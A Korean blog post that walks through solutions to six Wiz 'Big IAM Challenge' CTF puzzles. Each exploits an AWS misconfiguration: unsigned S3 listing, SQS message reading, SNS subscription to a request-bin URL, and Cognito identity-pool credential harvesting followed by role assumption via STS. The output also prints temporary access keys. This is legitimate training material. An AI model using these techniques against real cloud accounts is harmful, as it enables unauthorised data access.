---
title: 'The Big IAM Challenge Write-Up'
description: 'Wiz의 The Big IAM Challenge 6문제를 S3, SQS, SNS, Cognito, STS 권한 설정의 허점을 따라가며 풀어본 기록입니다.'
pubDate: 2026-08-21
category: cloud
topic: ctf
tags: [iam, ctf, aws]
---

## 1. Buckets of Fun

> We all know that public buckets are risky. But can you find the flag?

문제에서 제공되는 View IAM Policy를 보면 s3에 대하여 s3:GetObject과 s3:ListBucket 권한이 부여된 것을 확인할 수 있습니다.

![View IAM Policy](./the-big-iam-challenge-write-up/01.png)

그 중에서 s3:ListBucket은 files/*에 대해서만 권한이 허용되었습니다. 따라서 문제 내에서 가능한 동작은 s3 내 Object 목록과 다운로드가 있습니다.

먼저 s3 버킷의 `files/*`에만 권한이 허용되었으므로, `files` 내 Object를 확인했습니다.

```console
# files/ 디렉토리 X -> 확인 불가능!
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b
                           PRE files/

# files/ 디렉토리 확인 (files/*이므로 files라고 하면 동작 X)
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b/files/
2023-06-05 19:13:53         37 flag1.txt
2023-06-08 19:18:24      81889 logo.png
```

`thebigiamchallenge-storage-9979f4b/files/` 내에는 `flag1.txt`와 `logo.png`가 있습니다. 그래서 `flag1.txt`를 현재의 디렉토리에 복사를 시도했습니다만... 오류가 발생합니다!

```console
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt .
download failed: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ./flag1.txt [Errno 30] Read-only file system: '/var/task/flag1.txt.4D7b1BDb'

Completed 37 Bytes/37 Bytes (659 Bytes/s) with 1 file(s) remaining> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt .
```

찾아보니 AWS Lambda에서는 `/tmp`에만 파일 저장이 가능하다고 해서 `/tmp`로 바꿔 시도했지만 확인해보면 존재하지 않았습니다.

```console
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp
Completed 37 Bytes/37 Bytes (659 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ../../tmp/flag1.txt> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp

> ls -al ../../tmp
total 8
drwx------  2 sbx_user1051  990 4096 Aug 20 12:55 .
drwxr-xr-x 21 root         root 4096 Jan  1  1970 ..> ls -al ../../tmp
```

최초의 디렉토리를 보면 lambda_function.py가 존재하는데 해당 파일이 실행되면서 쉘이 실행되고, 한 줄의 명령어가 실행될 때마다 초기화돼서 `cp`를 시도해도 이후 파일이 남지 않았다.

```python
import json
from subprocess import run
import os


def lambda_handler(event, context):

    if 'body' not in event.keys():
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'OPTIONS,POST,GET'
            }
            }
    
    body_parsed = json.loads(event["body"])
    if 'command' not in body_parsed.keys():
            return {
        'statusCode': 200,
        'headers': {
            'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'OPTIONS,POST,GET'
        },
        'body': 'Command not found in request'
        }
    
    print("CMD", body_parsed['command'])
    env = os.environ.copy()
    env["PATH"] = f"{env['PATH']}:/opt"
    command_output = run(body_parsed['command'], capture_output=True, shell=True, env=env)
    
    return {
        'statusCode': 200,
        'headers': {
            'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'OPTIONS,POST,GET'
        },
        'body': json.dumps({
            'stdout': command_output.stdout.decode(), 
            'stderr': command_output.stderr.decode(), 
            'return_code': command_output.returncode
        })
    }
```

따라서 `&&`를 이용하여 쉽게 flag를 획득할 수 있었습니다.

```console
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp && cat /tmp/flag1.txt
Completed 37 Bytes/37 Bytes (794 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt to ../../tmp/flag1.txt
{wiz:모자이크}> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp && cat /tmp/flag1.txt

# 추가) stdout을 이용하여 바로 출력
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
{wiz:exposed-storage-risky-as-usual}> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
```

### 참고 자료

- [s3 — AWS CLI 2.36.28 Command Reference](https://docs.aws.amazon.com/cli/latest/reference/s3/)
- [AWS CLI에서 상위 수준(s3) 명령 사용 - AWS Command Line Interface](https://docs.aws.amazon.com/ko_kr/cli/v1/userguide/cli-services-s3-commands.html)

## 2.GoogleAnalytics

> We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong?  
> Join our queue and get the secret flag.

![View IAM Policy](./the-big-iam-challenge-write-up/02.png)

이번 문제에서는 sqs:SendMessage와 sqs:ReceiveMessage 권한이 허용되었습니다.

여기서 AWS SQS(Simple Queue Service)는 내구력 있고 가용성이 뛰어난 보안 호스팅 대기열을 제공하며 분산 소프트웨어 시스템과 구성 요소를 통합 및 분리할 수 있도록 하는 완전관리형 메시지 대기열 서비스입니다.

위 권한과 관련된 명령어는 다음과 같습니다.

```console
# aws sqs send-message --queue-url https://<queue-url> --message-body <message>
> aws sqs send-message --queue-url https://us-east-1.queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 --message-body "test"
{
    "MD5OfMessageBody": "098f6bcd4621d373cade4e832627b4f6",
    "MessageId": "7f2a332e-110c-4dd0-a975-0778a0398a4c"
}

# aws sqs receive-message --queue-rul https://<queue-url>
> aws sqs receive-message --queue-url https://us-east-1.queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
    "Messages": [
        {
            "MessageId": "e68afd34-bf4a-41ee-b909-1f1e7812b841",
            "ReceiptHandle": "AQEBGOuevQK2dKet8uf9Rlpmf/UVe8iPtCXgfIjWNdPJMtLm7K/fd3Y/qAr5s0Sn2yhUFkVyvrH29vrAE/+t/OQQjTVST89J3Osoo5/mc6dZo4q+1329RVd3x1qoZ2Pdb9R3B3aojvlUBYiRsPaGve1TVRJaqbBFegqLwO8C2mxbcvtuio
4kp1HIdrJ9+85qTG9I9IEKgmZlzRdM5ZOm5VoVDgakEzgMIqh809N+2g7wy6A2OGk4Dy9l72L62pdud/ZqQIwWVz2igxoHQKJbKWtwFs9+dW6CqQZbdS8CGJvpNnQNcVsQSt9bPFERxi42bos2ZUbEqMzpQ3LGrrkHKLY7+qDZI2NO08nZoWFJcFd/nhJ/6cigHAJrx8uvYxTsAE
28LC2yExSCjkzgoUMg6118Qdk5lZJB3CCpOi9TMEjTTcA=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
        }
    ]
}
```

`receive-message`를 통해서 Body에 위치한 s3 URL을 발견할 수 있고, 해당 파일에 flag가 있었습니다.

### 참고 자료

- [AWS CLI를 사용한 Amazon SQS 예시 - AWS Command Line Interface](https://docs.aws.amazon.com/ko_kr/cli/v1/userguide/cli_sqs_code_examples.html)

## 3. Enable Push Notifications

> We got a message for you. Can you get it?

![View IAM Policy](./the-big-iam-challenge-write-up/03.png)

이번 문제에서는 SNS:Subscribe 권한이 허용되었습니다.

다음 권한과 관련된 명령어를 사용하면 다음과 같습니다.

```console
# aws sns subscribe --topic-arn arn:aws:sns:us-west-2:123456789012:my-topic --protocol email --notification-endpoint my-email@example.com
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol email --notification-endpoint namu@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
```

하지만 코드 결과에는 위처럼만 나오기 때문에 flag 확인을 위해서는 @tbic.wiz.io이 필요하였습니다.

공식 문서를 찾아보면 `--protocol`로 다음과 같이 설정할 수 있습니다.

![--protocol 옵션](./the-big-iam-challenge-write-up/04.png)

Endpoint가 @tbic.wiz.io이면 되니깐 Dreamhack Tools 중 Request Bin을 활용해서 다음과 같이 시도하였습니다.

```console
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://cfptiag.request.dreamhack.games/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://cfptiag.request.dreamhack.games/@tbic.wiz.io
```

![Dreamhack Tools - Request Bin](./the-big-iam-challenge-write-up/05.png)

성공적으로 Request가 등록되었고, Body에서 SubscribeURL 속 URL에 접속 시도했습니다.

![Dreamhack Tools - Request Bin](./the-big-iam-challenge-write-up/06.png)

![SubscribeURL](./the-big-iam-challenge-write-up/07.png)

그러나 얻을 수 있는 정보는 딱히 없었습니다...

그렇게 다시 Request Bin을 접속하니 여러 Request가 쌓여 있었고, Message에 flag가 있었(?)습니다.

![Dreamhack Tools - Request Bin](./the-big-iam-challenge-write-up/08.png)

### 참고 자료

- [subscribe — AWS CLI 2.36.27 Command Reference](https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html)

## 4. Admin only?

> We learned from our mistakes from the past.  
> Now our bucket only allows access to one specific admin user. Or does it?

![View IAM Policy](./the-big-iam-challenge-write-up/09.png)

문제 1번과 동일한 권한에서 s3:ListBucket에 대하여 aws:PrincipalArn-"tag-key"의 user-name이 admin인 경우에만 허용됩니다.

일단 허용된 권한은 s3:GetObject와 s3:ListBucket 밖에 없고, 디렉토리 내 파일 목록을 보기위해서는 s3:ListBucket 자격증명부터 우회해야하므로 공식 문서를 참고하였습니다. 공식 문서 내에서의 옵션 중에 `--no-sign-request`가 있는데, 설명에 따르면 해당 인자가 주어지면 자격증명이 이루어지지 않는다고 적혀있었습니다.

![AWS CLI Reference](./the-big-iam-challenge-write-up/10.png)

따라서 해당 옵션을 통해서 `files/` 내 파일 목록을 볼 수 있었고, flag를 얻었습니다.

```console
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png

> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt -
{wiz:flag}
```

### 참고 자료

- [AWS 전역 조건 컨텍스트 키 - AWS Identity and Access Management](https://docs.aws.amazon.com/ko_kr/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-principalarn)
- [ls — AWS CLI 2.36.28 Command Reference](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html)

## 5. Do I know you?

> We configured AWS Cognito as our main identity provider.  
> Let's hope we didn't make any mistakes.

> **AWS Cognito**  
> AWS Cognito란 웹 및 모바일 앱에 대해 인증과 권한 부여 및 사용자 관리를 제공하고, 사용자는 로그인 보안 인증 정보를 사용하거나 Facebook, Amazon, Google 또는 Apple 같은 타사를 통해 로그인할 수 있습니다.  
> **User Pool**: 사용자 인증 및 권한 관리  
> **Identity Pool**: AWS 리소스에 액세스하는 데 사용할 수 있는 임시 AWS 자격 증명 제공

![View IAM Policy](./the-big-iam-challenge-write-up/11.png)

이 문제에서는 mobileanalytics:PutEvents와 cognito-sync:* 권한이 부여되었습니다.

mobileanalytics:PutEvents는 CLI 문서를 찾아보니 나오지 않고, Console 내 aws command로도 존재하지 않았습니다.

(왜 있는건지도 모르겠습니다...)

cognito-sync는 애플리케이션 관련 사용자 데이터를 여러 기기에서 동기화할 수 있도록 해주는 AWS 서비스 및 클라이언트 라이브러리입니다. (지금은 cognito를 비권장하고 AppSync 서비스를 권장한다고 합니다.) 그렇게 모든 명령어를 찾아봤지만... Identity Pool ID를 알아야 가능했습니다.

문제 사이트 HTML 코드를 보면 cognito 관련 script 코드를 발견할 수 있었고, Identity Pool ID를 얻었습니다.

![script](./the-big-iam-challenge-write-up/12.png)

이를 바탕으로 Identity ID를 얻고, Credential을 발급받았습니다.

```console
> aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "모자이크"
}

> aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-eeeb-ca37-3032-549a5510ff8a
{
    "IdentityId": "모자이크",
    "Credentials": {
        "AccessKeyId": "모자이크",
        "SecretKey": "모자이크",
        "SessionToken": "모자이크",
        "Expiration": 1787306038.0
    }
}
```

```bash
aws configure
```

얻은 자격을 바탕으로 WSL에서 자격 증명을 마친 후, flag를 얻었습니다!

### 참고 자료

- [cognito-identity — AWS CLI 2.36.28 Command Reference](https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/)

## 6. One final push

> Anonymous access no more. Let's see what can you do now.  
> Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

![View IAM Policy](./the-big-iam-challenge-write-up/13.png)

sts:AssumeRoleWithWebIdentity 권한을 통해서 해당 명령어를 사용할 수 있었고, 형식은 다음과 같습니다.

```bash
assume-role-with-web-identity
--role-arn <value>
--role-session-name <value>
--web-identity-token <value>
```

Identity Pool Id가 주어져있으므로, 5번 문제 과정을 반복하여 임시자격을 획득합니다. 그리고 위 형식에 맞춰서 작성하면 해당 arn에 맞는 자격을 획득하게 됩니다.

```console
> aws cognito-identity get-open-id-token --identity-id us-east-1:157d6171-eefd-ceef-83c1-a5a27b1f9d2c
{
    "IdentityId": "us-east-1:157d6171-eefd-ceef-83c1-a5a27b1f9d2c",
    "Token": "eyJraWQiOiJ1cy1lYXN0LTEtMT..."
}

> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-name asb --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEtMT...
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXNQNAPR64",
        "SecretAccessKey": "kcvOUrBN8I40RVpWfgwSd9IEVKX+3Q7gzpsUrA1Q",
        "SessionToken": "FwoGZXIvYXdzEPD//////////wEaDF6m8xa5g+OkozHp/SKdArutR...",
        "Expiration": "2026-08-21T15:46:43Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-eefd-ceef-83c1-a5a27b1f9d2c",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:asb",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/asb"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
```

따라서 해당 자격에 대해 WSL로 접속하면 s3 권한이 부여돼있어서 flag를 얻을 수 있습니다.

```console
namu17@DESKTOP:~$ aws s3 ls
2024-06-06 15:21:35 challenge-website-storage-1fa5073
2025-06-10 00:28:07 challenge01-470f711
2024-06-06 17:25:59 payments-system-cd6e4ba
2023-06-05 02:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 22:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 01:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 22:28:31 wiz-privatefiles
2023-06-05 22:28:31 wiz-privatefiles-x1000

namu17@DESKTOP:~$ aws s3 ls wiz-privatefiles-x1000
2023-06-06 04:42:27       4220 cognito2.png
2023-06-05 22:28:35         40 flag2.txt

namu17@DESKTOP:~$ aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-flag}
```

### 참고 자료

- [assume-role-with-web-identity — AWS CLI 2.36.28 Command Reference](https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html)

## 수료증

![수료증](./the-big-iam-challenge-write-up/14.png)
